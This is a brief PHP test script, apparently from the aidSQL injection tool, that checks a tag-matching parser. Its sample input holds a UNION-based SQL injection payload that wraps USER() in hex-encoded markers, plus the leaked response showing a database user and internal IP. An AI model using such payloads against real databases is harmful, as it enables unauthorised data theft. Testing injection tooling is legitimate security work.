<?php

	//Interfaces
	require_once "interface/Parser.interface.php";

	//Parsers
	require_once "class/parser/Generic.parser.php";
	require_once "class/parser/TagMatcher.parser.php";

	$openTag  = "i1a0e";
	$closeTag = "ie103";

	$content="
SELECT cmts,descripcion_cmts FROM cm.cm_cmts WHERE cmts=12 UNION ALL SELECT CONCAT(0x6931613065,USER(),0x6965313033),2 LIMIT 1,1
<h2>ERROR:</h2><h2>i1a0ecm@10.200.103.38ie103</h2>
<h2>2</h2>
";

	$tagMatch = new aidSQL\parser\TagMatcher($content);
	$tagMatch->setOpenTag($openTag);
	$tagMatch->setCloseTag($closeTag);
	var_dump($tagMatch->getResult());


?>
